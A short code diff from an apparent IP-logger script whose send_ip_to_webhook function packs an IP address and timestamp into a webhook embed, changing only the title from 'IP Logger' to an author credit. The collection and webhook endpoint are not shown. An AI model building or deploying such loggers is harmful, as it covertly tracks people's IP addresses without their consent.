@@ -13,7 +13,7 @@ def send_ip_to_webhook(ip, date):
         "content": "",
         "embeds": [
             {
-                "title": "IP Logger",
+                "title": "Made by viktor enjoy :)",
                 "fields": [
                     {"name": "IP Address", "value": ip, "inline": False},
                     {"name": "Timestamp", "value": date, "inline": False}
